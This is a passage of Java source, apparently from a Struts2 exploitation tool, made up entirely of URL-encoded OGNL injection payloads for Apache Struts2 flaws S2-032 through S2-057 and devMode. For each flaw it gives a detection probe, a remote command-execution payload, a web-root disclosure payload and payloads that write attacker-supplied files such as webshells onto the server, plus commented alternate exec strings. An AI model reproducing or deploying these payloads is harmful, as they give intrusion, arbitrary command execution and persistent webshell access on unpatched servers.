        public static final String EXEC_DEV = "debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=&command={EXEC}";
        public static final String PATH_DEV = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path))&pp=%2f";
        public static final String UPLOAD_DEV = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print('UPLO'),%23w.print('AD-OK'),%23w.close())&shellname={FILENAME}&shellContent={FILECONTENT}&encoding={ENCODE}&pp=%2f";
        public static final String USER_UPLOAD_DEV = "debug=browser&object=(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d@org.apache.struts2.ServletActionContext@getRequest(),%23res%3d@org.apache.struts2.ServletActionContext@getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23path%3d%23parameters.pp%5B0%5D,new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path).append(%23parameters.content%5B0%5D)).close(),%23w.print('UPLO'),%23w.println('AD-OK'),%23w.close())&content={FILECONTENT}&encoding={ENCODE}&pp={REALPATH}";
        //Struts2_032 POST
        public static final String INFO032 = "[+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); ";
        public static final String POC032 = "method%3a%23_memberAccess%3d@ognl.OgnlContext+@DEFAULT_MEMBER_ACCESS%2c%23kxlzx%3d+@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28" + r1 + "*" + r2 + "%29%2c%23kxlzx.close";
        public static final String EXEC032 = "method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command={EXEC}";
        public static final String PATH032 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding={ENCODE}";
        public static final String UPLOAD032 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.content1[0]),%23w.println(%23parameters.content2[0]),%23w.close(),1?%23xx:%23request.toString&shellname={FILENAME}&shellContent={FILECONTENT}&encoding={ENCODE}&pp=%2f&content1=UPLO&content2=AD-OK";
        public static final String USER_UPLOAD032 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d@org.apache.struts2.ServletActionContext@getRequest(),%23res%3d@org.apache.struts2.ServletActionContext@getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23path%3d%23parameters.pp%5B0%5D,new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path).append(%23parameters.content%5B0%5D)).close(),%23w.print(%23parameters.c1[0]),%23w.println(%23parameters.c2[0]),%23w.close(),1%3F%23xx:%23request.toString&content={FILECONTENT}&encoding={ENCODE}&pp={REALPATH}&c1=UPLO&c2=AD-OK";
        //Struts2_037 GET方法 UPLOAD方法比较特殊，需要使用post方法分开传
        public static final String INFO037 = "[+] S2-037:影响版本Struts 2.3.20-2.3.28.1; ";
        public static final String POC037 = "%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.print(" + r1 + "*" + r2 + "),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse";
        public static final String EXEC037 = "%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command={EXEC}";
        public static final String PATH037 = "%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f";
        public static final String UPLOAD037 = "(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3F(%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23res=@org.apache.struts2.ServletActionContext@getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w=%23res.getWriter(),%23path=%23req.getRealPath(%23parameters.pp%5B0%5D),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path+%23parameters.shellname%5B0%5D).append(%23parameters.content%5B0%5D)).close(),%23w.print(%23parameters.c1%5B0%5D),%23w.println(%23parameters.c2%5B0%5D),%23w.close()):xx.toString.json|obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2F&c1=UPLO&c2=AD-OK&encoding={ENCODE}&shellname={FILENAME}&content={FILECONTENT}";
        public static final String USER_UPLOAD037 = "(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3F(%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23res=@org.apache.struts2.ServletActionContext@getResponse(),%23res.setCharacterEncoding(%23parameters.en%5B0%5D),%23w=%23res.getWriter(),%23path=%23parameters.pp%5B0%5D,new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path).append(%23parameters.content%5B0%5D)).close(),%23w.print(%23parameters.c1%5B0%5D),%23w.println(%23parameters.c2%5B0%5D),%23w.close()):xx.toString.json|obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp={REALPATH}&en={ENCODE}&content={FILECONTENT}&c1=UPLO&c2=AD-OK";
        //Struts2_045 POST 触发点在Content-type
        public static final String INFO045 = "[+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; ";
        public static final String POC045 = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES'," + r1 + "*" + r2 + ")}.multipart/form-data";
        public static final String EXEC045 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{EXEC}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
        public static final String PATH045 =
                "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}";
        public static final String UPLOAD045 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=(@org.apache.struts2.ServletActionContext@getRequest())).(#path1=#req.getRealPath('/')).(#sb=(new java.lang.StringBuilder(#path1))).(#path=#sb.append('/{FILENAME}')).(#shell='{FILECONTENT}').(#file=new java.io.File(#path)).(#fw=new java.io.FileWriter(#file)).(#fw.write(#shell)).(#fw.flush()).(#fw.close()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('UPLO')).(#ros.println('AD-OK')).(#ros.flush())}";
        public static final String USER_UPLOAD045 = "con={FILECONTENT}&realpath={REALPATH}|%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#resp=@org.apache.struts2.ServletActionContext@getResponse()).(#content=#req.getParameter('con')).(#content=new java.lang.String(#content)).(#file=new java.io.File(#parameters['realpath'][0])).(#fos=new java.io.FileOutputStream(#file)).(#fos.write(#content.getBytes())).(#fos.flush()).(#fos.close()).(#resp.getWriter().print('UPLO')).(#resp.getWriter().println('AD-OK')).(#resp.getWriter().flush()).(#resp.getWriter().close())}";
        //Struts2_046  upload 需要get参数传递shell内容
        public static final String INFO046 = "[+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; ";
        public static final String POC046 = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-RES'," + r1 + "*" + r2 + ")}\u0000b";
        public static final String EXEC046 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{EXEC}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\u0000b";
        public static final String PATH046 = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#path=#req.getRealPath('/')).(#o.println(#path)).(#o.close())}\u0000b";
        public static final String UPLOAD046 = "content={FILECONTENT}|%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#resp=@org.apache.struts2.ServletActionContext@getResponse()).(#content=#req.getParameter('content')).(#content=new java.lang.String(#content)).(#path=#req.getSession().getServletContext().getRealPath('/')).(#file=new java.io.File(#path +'/{FILENAME}')).(#fos=new java.io.FileOutputStream(#file)).(#fos.write(#content.getBytes())).(#fos.flush()).(#fos.close()).(#resp.getWriter().print('UPLO')).(#resp.getWriter().println('AD-OK')).(#resp.getWriter().flush()).(#resp.getWriter().close())}\u0000b";
        public static final String USER_UPLOAD046 = "con={FILECONTENT}&rpath={REALPATH}|%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#resp=@org.apache.struts2.ServletActionContext@getResponse()).(#content=#req.getParameter('con')).(#content=new java.lang.String(#content)).(#file=new java.io.File(#parameters['rpath'][0])).(#fos=new java.io.FileOutputStream(#file)).(#fos.write(#content.getBytes())).(#fos.flush()).(#fos.close()).(#resp.getWriter().print('UPLO')).(#resp.getWriter().println('AD-OK')).(#resp.getWriter().flush()).(#resp.getWriter().close())}\u0000b";
        //Struts2_048
        public static final String INFO048 = "[+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; ";
        public static final String POC048 = "name=%25%7B" + r1 + "%2A" + r2 + "%7D&age=2&bustedBefore=true&description=3&__checkbox_bustedBefore=true";
        public static final String EXEC048 = "%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3d%27{EXEC}%27%29.%28%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3d%28%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d%29%29.%28%23p%3dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3d%23p.start%28%29%29.%28%23ros%3d%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2c%23ros%29%29.%28%23ros.flush%28%29%29%7d";
        public static final String PATH048 = "name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29.%28%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23path%3D%23req.getRealPath%28%22%2f%22%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7d&age=1&__checkbox_bustedBefore=true&description=1";
        public static final String UPLOAD048 = "name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23req%3D%28@org.apache.struts2.ServletActionContext@getRequest%28%29%29%29.%28%23path1%3D%23req.getRealPath%28%22%2f%22%29%29.%28%23sb%3D%28new+java.lang.StringBuilder%28%23path1%29%29%29.%28%23path%3D%23sb.append%28%22%2f{FILENAME}%22%29%29.%28%23shell%3D%22{FILECONTENT}%22%29.%28%23file%3Dnew+java.io.File%28%23path%29%29.%28%23fw%3Dnew+java.io.FileWriter%28%23file%29%29.%28%23fw.write%28%23shell%29%29.%28%23fw.flush%28%29%29.%28%23fw.close%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29%29.%28%23ros.print%28%22UPLO%22%29%29.%28%23ros.println%28%22AD-OK%22%29%29.%28%23ros.flush%28%29%29%7d&age=1&__checkbox_bustedBefore=true&description=1";
        public static final String USER_UPLOAD048 = "name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23resp%3D@org.apache.struts2.ServletActionContext@getResponse%28%29%29.%28%23content%3Dnew+java.lang.String%28%22{FILECONTENT}%22%29%29.%28%23file%3Dnew+java.io.File%28%22{REALPATH}%22%29%29.%28%23fos%3Dnew+java.io.FileOutputStream%28%23file%29%29.%28%23fos.write%28%23content.getBytes%28%29%29%29.%28%23fos.flush%28%29%29.%28%23fos.close%28%29%29.%28%23resp.getWriter%28%29.print%28%22UPLO%22%29%29.%28%23resp.getWriter%28%29.println%28%22AD-OK%22%29%29.%28%23resp.getWriter%28%29.flush%28%29%29.%28%23resp.getWriter%28%29.close%28%29%29%7d&age=1&__checkbox_bustedBefore=true&description=1";
        //Struts2_053 需要参数
        public static final String INFO053 = "[+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; ";
        public static final String POC053 = "%25%7B" + r1 + "%2A" + r2 + "%7D";
        public static final String EXEC053 = "%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27{EXEC}%27%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23process.getInputStream%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%2C%27UTF-8%27%29%29%7D";
        public static final String PATH053 = "%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23o%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29.%28%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23path%3D%23req.getRealPath%28%22%2f%22%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7D";
        public static final String UPLOAD053 = "%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23req%3D%28@org.apache.struts2.ServletActionContext@getRequest%28%29%29%29.%28%23path1%3D%23req.getRealPath%28%22%2f%22%29%29.%28%23sb%3D%28new+java.lang.StringBuilder%28%23path1%29%29%29.%28%23path%3D%23sb.append%28%22%2f{FILENAME}%22%29%29.%28%23shell%3D%22{FILECONTENT}%22%29.%28%23file%3Dnew+java.io.File%28%23path%29%29.%28%23fw%3Dnew+java.io.FileWriter%28%23file%29%29.%28%23fw.write%28%23shell%29%29.%28%23fw.flush%28%29%29.%28%23fw.close%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%29%29.%28%23ros.print%28%22UPLO%22%29%29.%28%23ros.println%28%22AD-OK%22%29%29.%28%23ros.flush%28%29%29%7D";
        public static final String USER_UPLOAD053 = "%25%7B%28%23_%3D%27multipart%2Fform-data%27%29.%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23req%3D@org.apache.struts2.ServletActionContext@getRequest%28%29%29.%28%23resp%3D@org.apache.struts2.ServletActionContext@getResponse%28%29%29.%28%23content%3Dnew+java.lang.String%28%22{FILECONTENT}%22%29%29.%28%23file%3Dnew+java.io.File%28%22{REALPATH}%22%29%29.%28%23fos%3Dnew+java.io.FileOutputStream%28%23file%29%29.%28%23fos.write%28%23content.getBytes%28%29%29%29.%28%23fos.flush%28%29%29.%28%23fos.close%28%29%29.%28%23resp.getWriter%28%29.print%28%22UPLO%22%29%29.%28%23resp.getWriter%28%29.println%28%22AD-OK%22%29%29.%28%23resp.getWriter%28%29.flush%28%29%29.%28%23resp.getWriter%28%29.close%28%29%29%7D";

        //Struts2_057
        public static final String INFO057 = "";
        public static final String POC057 = "%24%7B" + r1 + "%2A" + r2 + "%7D";
        //  addHeader('RETURN',xxx)
        // Linux exec %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29%29.%28%23w.print%28%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D
        // Win   exec1 %25%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23_memberAccess%3f(%23_memberAccess%3d%23dm)%3a((%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ognlUtil%3d%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))).(%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse()).(%23res.addHeader(%27RETURN%27%2c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(%27{EXEC}%27).getInputStream())))%7d
        // Win   exec2 %24%7b%28%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b51020%5d%2c%23c.read%28%23d%29%2c%23jas502n%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23jas502n.println%28%23d%29%2c%23jas502n.close%28%29%29%7d
        public static final String EXEC057 = "%24%7b%28%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23w%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27{EXEC}%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7d";
        //  addHeader('WEBPATH',xxx)
        //Linux path %24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23o%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%29.%28%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest%28%29%29.%28%23path%3d%23req.getRealPath%28%27/%27%29%29.%28%23o.println%28%23path%29%29.%28%23o.close%28%29%29%7D
